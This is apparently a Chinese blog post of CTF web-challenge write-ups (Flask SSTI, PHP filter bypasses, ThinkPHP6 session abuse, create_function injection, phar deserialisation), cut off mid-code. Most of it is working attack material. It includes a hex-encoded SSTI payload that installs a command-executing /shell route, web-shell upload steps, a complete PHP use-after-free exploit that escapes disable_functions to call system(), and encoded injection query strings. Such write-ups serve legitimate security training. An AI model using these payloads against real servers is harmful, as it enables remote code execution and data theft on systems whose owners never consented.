&lt;?php error_reporting(0); if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); exit(); &#125; function is_valid($str) &#123; $banword &#x3D; [ &#x2F;&#x2F; no path traversal &#39;\\.\\.&#39;, &#x2F;&#x2F; no stream wrapper &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;, &#x2F;&#x2F; no data exfiltration &#39;flag&#39; ]; $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true; &#125; $body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #body获取post数据 $json &#x3D; json_decode($body, true); #对body变量进行json解码 if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#判断body变量是否有效，json数据要有page $page &#x3D; $json[&#39;page&#39;]; $content &#x3D; file_get_contents($page); #从page中读出文件名，并读取文件 if (!$content || !is_valid($content)) &#123;#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过 $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\\n&quot;; &#125; &#125; else &#123; $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;; &#125; &#x2F;&#x2F; no data exfiltration!!! $content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\\&#123;.+\\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代 echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出 这里可以利用json_decode会将\\uxxx进行转义的特性，这样就可以绕过is_valid的检测 [WUSTCTF2020]CV Maker进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置 通过更改头像传个马上去，蚁剑连接就行 这里前端有个判断图片类型的地方，所以先传个jpg再bp抓包改成php就行 [RootersCTF2019]I_&lt;3_Flaskssti注入，用使用工具Arjun进行参数爆破 然后找到name参数后，拿出珍藏的写入shell的payload ctf中flask_ssti的各种绕过技巧 - 先知社区 (aliyun.com) &#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x0a\\x0a\\x40\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x2e\\x72\\x6f\\x75\\x74\\x65\\x28\\x27\\x2f\\x73\\x68\\x65\\x6c\\x6c\\x27\\x2c\\x6d\\x65\\x74\\x68\\x6f\\x64\\x73\\x3d\\x5b\\x27\\x47\\x45\\x54\\x27\\x2c\\x27\\x50\\x4f\\x53\\x54\\x27\\x5d\\x29\\x0a\\x64\\x65\\x66\\x20\\x73\\x68\\x65\\x6c\\x6c\\x28\\x29\\x3a\\x0a\\x20\\x20\\x20\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73\\x0a\\x20\\x20\\x20\\x20\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x0a\\x20\\x20\\x20\\x20\\x63\\x6d\\x64\\x3d\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x61\\x72\\x67\\x73\\x2e\\x67\\x65\\x74\\x28\\x27\\x63\\x6d\\x64\\x27\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x74\\x3d\\x6f\\x73\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x63\\x6d\\x64\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x72\\x74&#39;) %&#125;&#123;% endif%&#125; 其中的16进制编码了原始代码 即 from flask import current_app @current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def shell(): import os from flask import request cmd&#x3D;request.args.get(&#39;cmd&#39;) rt&#x3D;os.popen(cmd).read() return rt 写入 然后直接写入命令 可能会出现not found的报错，多试几次 [CISCN2019 华东南赛区]Double Secret 有/secret目录，扫一下或者猜出来 arjun扫一下是否有传参 当数过大时就会进入debug界面，这时候基本就确定这是ssti注入了，可以看看源码 采用RC4加密的方式，这是一种对称加密，对密文再次加密就会变成明文，密钥是HereIsTreasure，知道这个后，利用cyberchef，对要输入的语句进行加密，再将密文传参进去 能找到根目录下的flag.txt cat读取 这里应该是取巧了，buu的flag里不包含ciscn，所以这个过滤就没用了 从一道ctf题谈谈flask开启debug模式存在的安全问题_pin (sohu.com) [红明谷CTF 2021]write_shell&lt;?php error_reporting(0); highlight_file(__FILE__); function check($input)&#123; if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123; &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123; die(&#39;hacker!!!&#39;); &#125;else&#123; return $input; &#125; &#125; function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key&#x3D;&gt;$output)&#123; $input[$key] &#x3D; waf($output); &#125; &#125;else&#123; $input &#x3D; check($input); &#125; &#125; $dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;; if(!file_exists($dir))&#123; mkdir($dir); &#125; switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#39;pwd&#39;: echo $dir; break; case &#39;upload&#39;: $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); &#125; ?&gt; 过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\\t PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。 ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\\t&#x2F;&#96;?&gt; ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;flllllll1112222222lag&#96;?&gt; 或者 ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;f*&#96;?&gt; *为通配符 [GYCTF2020]EasyThinking题目时thinkphp6版本的漏洞 ThinkPHP6 任意文件操作漏洞分析 - 链滴 (ld246.com) 只需要构造 PHPSESSID 的值即可，值为 string&amp;&amp;长度为 32 此时查看一下生成的 session，生成的 session 文件保存在 \\runtime\\session 下 session 里的内容: a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125; 可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell 这个师傅构造了一个向SESSION中写入值的类和函数，但是在本题中，搜索的内容直接被写入了SESSION（别问，问就是我也看不懂 所以我们可以修改session为.php的后缀，然后 在搜索栏里搜个马，就可以在/runtime/session路径下访问并执行这个马 先试试phpinfo /runtime/session/sess_0123456789012345678901234568.php 写个一句话木马 蚁剑连接 根目录又flag但是打开没东西，还有一个readflag是二进制文件,猜测是要执行readflag来读取flag文件里的内容 但是在虚拟终端无法执行命令 结合phpinfo里的禁用函数 能得出这是个突破disable_function限制执行命令的考点 之前[极客大挑战 2019]RCE ME也有这个考点（往上翻 但是在这道题里用蚁剑的插件没法绕过 上个exp（羡慕能写出这种exp的大师傅 &lt;?php pwn(&quot;&#x2F;readflag&quot;); function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;) if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4 $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p + $j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i &#x3D; 0; $i &lt; $m; $i++) &#123; $out .&#x3D; chr($ptr &amp; 0xff); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; chr($v &amp; 0xff); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if ($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec $text_size &#x3D; $p_memsz; &#125; &#125; if (!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;constant&#39; constant check if ($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;bin2hex&#39; constant check if ($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while ($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if (stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; # increase this value if UAF fails $contiguous &#x3D; []; for ($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if (!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if (!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if (!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset &#x3D; 0xd0; for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit(); &#125; 把这个php文件找个地方传上去 访问这个路径，得到flag [BJDCTF2020]EzPHP这个题是个挺有意思的代码审计题 中间这个东西链接好像寄了，但是不影响做题，源码里有串base32，解码为1nD3x.php 访问这个页面 &lt;?php highlight_file(__FILE__); error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;; $shana &#x3D; $_GET[&#39;shana&#39;]; $passwd &#x3D; $_GET[&#39;passwd&#39;]; $arg &#x3D; &#39;&#39;; $code &#x3D; &#39;&#39;; echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;; if($_SERVER) &#123; if ( preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;]) ) die(&#39;You seem to want to do something bad?&#39;); &#125; if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123; if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; $file &#x3D; $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;); if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value)) die(&#39;fxck you! I hate English!&#39;); &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;); if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;; &#125; else&#123; die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;); &#125; if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\&#96;|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#39;|\\&#x3D;|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^&#x2F;i&#39;, $arg) ) &#123; die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#39;&#39;, $arg); &#125; ?&gt; 过滤了一堆东西 首先是这个，query_string获取的内容不会进行url解码，所以绕过这一步就只需要把传入的参数进行url编码就行 这里可以用换行符%0a绕过preg_match的匹配 这个由于检测的$_REQUEST，而对 $_REQUEST来说post的优先级大于get，所以要post传入和get内容相同的参数，把值改为数字就行 这个要用data://伪协议就行 常见的数组绕过 最后这也是最重要的地方 首先说一下create_function注入 create_function() 函数有两个参数 $args 和 $code，用于创建一个 lambda 样式的函数 但是我们可以通过对b进行操作，来实现这个函数的提前闭合，并写入我们想要的命令，然后通过注释符使语句合理 $arg 和 $code 变量都是可控的，因为 extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要 extract() 内的数组键名为 arg 和 code，键值为我们构造的用来注入的代码，即可实现 $arg 和 $code 的变量覆盖，导致代码注入。 再利用 var_dump(get_defined_vars()) 用来输出所有变量和值 &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e 解码内容： &#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute &amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function 但是看见flag在rea1fl4g里 所以要利用require包含这个文件然后再用get_defined_vars()读一遍试试 但是又过滤了. 所以试试base64编码 GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 还是不行，尝试伪协议读源码了只能 require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php) 采用取反绕过过滤 GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 &#x2F;&#x2F; preg_match() 只能匹配字符串，数组得以绕过。 2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L&#39;Amore (gem-love.com) 原题用异或也可以，贴个脚本先，万一以后能用到 #Author: piCEBDC7 str_&#x3D; &#39;1flag.php&#39; str_&#x3D;list(str_) final&#x3D;&#39;&#39; for x in str_: print(hex(~ord(x)&amp;0xff)) final+&#x3D;hex(~ord(x)&amp;0xff) print(str_) final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;) final+&#x3D;&#39;^&#39; for x in range(len(str_)): final+&#x3D;r&#39;%ff&#39; print(final) 取反脚本 &lt;? &#x2F;&#x2F;Author: 颖奇L&#39;Amore &#x2F;&#x2F;Blog: www.gem-love.com $a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;; $arr1 &#x3D; explode(&#39; &#39;, $a); echo &quot;&lt;br&gt;~(&quot;; foreach ($arr1 as $key &#x3D;&gt; $value) &#123; echo &quot;%&quot;.bin2hex(~$value); &#125; echo &quot;)&lt;br&gt;&quot;; 用羽师傅那个也行 [CISCN2019 华北赛区 Day1 Web1]Dropbox知识点：phar的反序列化 传个jpg文件然后下载的时候抓包有个filename，这里可以实现任意文件读取 index.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; $a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]); $a-&gt;Name(); $a-&gt;Size(); ?&gt; download.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;); chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123; Header(&quot;Content-type: application&#x2F;octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename)); echo $file-&gt;close(); &#125; else &#123; echo &quot;File not exist&quot;; &#125; ?&gt; login.php &lt;?php session_start(); if (isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: index.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; if (isset($_GET[&#39;register&#39;])) &#123; echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;; &#125; if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123; $u &#x3D; new User(); $username &#x3D; (string) $_POST[&quot;username&quot;]; $password &#x3D; (string) $_POST[&quot;password&quot;]; if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123; $_SESSION[&#39;login&#39;] &#x3D; true; $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username); $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;; if (!is_dir($sandbox)) &#123; mkdir($sandbox); &#125; $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox; echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;); die(); &#125; echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;; &#125; ?&gt; class.php &lt;?php error_reporting(0); $dbaddr &#x3D; &quot;127.0.0.1&quot;; $dbuser &#x3D; &quot;root&quot;; $dbpass &#x3D; &quot;root&quot;; $dbname &#x3D; &quot;dropbox&quot;; $db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db &#x3D; $db; &#125; public function user_exist($username) &#123; $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count &#x3D; $stmt-&gt;num_rows; if ($count &#x3D;&#x3D;&#x3D; 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; &#125; class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files &#x3D; array(); $this-&gt;results &#x3D; array(); $this-&gt;funcs &#x3D; array(); $filenames &#x3D; scandir($path); $key &#x3D; array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key &#x3D; array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file &#x3D; new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] &#x3D; array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;; $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;; foreach ($this-&gt;funcs as $func) &#123; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;; foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123; $table .&#x3D; &#39;&lt;tr&gt;&#39;; foreach ($result as $func &#x3D;&gt; $value) &#123; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;td 